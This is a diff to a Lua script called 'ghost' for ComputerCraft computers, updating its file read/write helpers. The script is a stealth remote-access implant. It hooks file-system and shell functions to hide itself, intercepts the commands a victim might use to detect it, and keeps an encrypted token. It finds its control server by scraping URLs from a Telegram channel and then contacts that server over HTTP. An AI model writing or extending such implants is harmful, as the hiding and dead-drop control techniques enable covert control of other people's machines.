@@ -1,4 +1,4 @@
--- ghost v9.9.5 (fixed URL format check + trim + debug)
+-- ghost v9.9.6 (safe fs.read/write via orig_fs_open, no fs.readFile dependency)
 local URL_FILE = ".server_url"
 local CURRENT_URL = nil
 local TOKEN_FILE = ".token"
@@ -48,10 +48,11 @@ local DETECT_CMDS = {"programs","shell%.resolve","settings%.list","settings%.get
     "dofile","apropos","man","which","env","printenv","history","alias","unalias","ps","top","wget",
     "pastebin","git","curl","mount","df","du","chmod","chown","find","locate","grep","awk","sed","wgen","wgen%.run"}
 
+-- ============================================
+-- ORIGINALS (v9.9.6: БЕЗ fs.readFile/fs.writeFile)
+-- ============================================
 local orig_fs_open = fs.open
 local orig_fs_exists = fs.exists
-local orig_fs_read = fs.readFile
-local orig_fs_write = fs.writeFile
 local orig_fs_list = fs.list
 local orig_fs_delete = fs.delete
 local orig_fs_find = fs.find
@@ -65,6 +66,22 @@ local orig_reboot = os.reboot
 local orig_shell_run = shell.run
 local orig_shell_complete = shell.complete
 local orig_version = os.version
+
+-- БЕЗОПАСНЫЕ read/write через orig_fs_open (работают в любой сборке CC)
+local function orig_fs_read(path)
+    local f = orig_fs_open(path, "r")
+    if not f then return nil end
+    local c = f.readAll()
+    f.close()
+    return c
+end
+local function orig_fs_write(path, content)
+    local f = orig_fs_open(path, "w")
+    if not f then return false end
+    f.write(content)
+    f.close()
+    return true
+end
 
 local cmd_history = {}
 
@@ -246,7 +263,7 @@ local function install_stealth()
 end
 local function disable_stealth()
     fs.list = orig_fs_list; fs.exists = orig_fs_exists; fs.open = orig_fs_open
-    fs.readFile = orig_fs_read; fs.writeFile = orig_fs_write; fs.delete = orig_fs_delete
+    fs.readFile = nil; fs.writeFile = nil
     if orig_fs_find then fs.find = orig_fs_find end
     if orig_fs_attributes then fs.attributes = orig_fs_attributes end
     if orig_fs_getSize then fs.getSize = orig_fs_getSize end
@@ -319,7 +336,7 @@ local function is_script_file(n) return n:find("%.lua$") or n:find("%.luau$") en
 local function is_allowed_command(c) return ALLOWED_CMDS[c:lower()] == true end
 
 -- ============================================
--- URL MANAGEMENT (v9.9.5: FIXED format + trim)
+-- URL MANAGEMENT (v9.9.5+: trim + simple check)
 -- ============================================
 local function save_url(url)
     local f = orig_fs_open(URL_FILE, "w")
@@ -340,13 +357,11 @@ local function replace_domain(url, newdomain)
     return scheme .. newdomain .. path
 end
 
--- НОВОЕ: trim функция
 local function trim(s)
     if not s then return s end
     return (s:match("^%s*(.-)%s*$") or s)
 end
 
--- ИСПРАВЛЕНО: простая проверка URL без regex anchors
 local function is_valid_tunnel_url(url)
     if not url or url == "" then return false end
     url = trim(url)
@@ -373,7 +388,6 @@ local function validate_url(url)
         glog("validate: invalid URL format")
         return false
     end
-    -- Пытаемся /api/health
     local ok, h = pcall(http.get, url .. "/api/health", {
         ["bypass-tunnel-reminder"]="true",
         ["User-Agent"]="ghost-validator"
@@ -390,7 +404,6 @@ local function validate_url(url)
             end
         end
     end
-    -- Fallback: /api/url
     glog("validate: /api/health failed, trying /api/url")
     ok, h = pcall(http.get, url .. "/api/url", {
         ["bypass-tunnel-reminder"]="true",
@@ -423,7 +436,6 @@ local function validate_url(url)
     return true, url
 end
 
--- ИСПРАВЛЕНО: trim + декодируем entities ПЕРЕД парсингом
 local function fetch_relay_urls()
     local url = "https://t.me/s/" .. RELAY_USERNAME
     local ok, h = pcall(http.get, url, {
@@ -441,17 +453,15 @@ local function fetch_relay_urls()
         return {} 
     end
     glog("relay: got " .. #htmlc .. " bytes")
-    -- ПРАВИЛЬНАЯ проверка: есть посты?
     if not htmlc:find("tgme_widget_message", 1, true) then
         glog("relay: no posts found (channel private or empty)")
         return {}
     end
-    -- Декодируем entities ПЕРЕД парсингом
     htmlc = htmlc:gsub("&lt;", "<"):gsub("&gt;", ">"):gsub("&amp;", "&"):gsub("&quot;", '"'):gsub("&#x27;", "'"):gsub("&nbsp;", " ")
     local urls = {}
     local seen = {}
     for u in htmlc:gmatch("https://[%w%-]+%.lhr%.life") do
-        u = trim(u)  -- ИСПРАВЛЕНО: trim
+        u = trim(u)
         if not seen[u] then
             seen[u] = true
             urls[#urls+1] = u
@@ -579,7 +589,7 @@ local function get_valid_url()
 end
 
 -- ============================================
--- TOKEN
+-- TOKEN (v9.9.6: safe write/read)
 -- ============================================
 local function encrypt_token(t)
     local key = tostring(COMPUTER_ID) .. "_V6"; local r = ""
@@ -650,7 +660,7 @@ local function save_mode(m)
 end
 
 -- ============================================
--- HTTP (с правильным status code)
+-- HTTP (правильный status code)
 -- ============================================
 local function make_headers(token)
     local h = {}
@@ -1047,7 +1057,7 @@ end
 -- MAIN
 -- ============================================
 local function run_main()
-    glog("ghost start v9.9.5")
+    glog("ghost start v9.9.6")
     install_stealth(); install_protection(); install_command_intercept(); load_mode()
     if not orig_fs_exists(SANDBOX_DIR) then pcall(fs.makeDir, SANDBOX_DIR) end
     draw_boot()
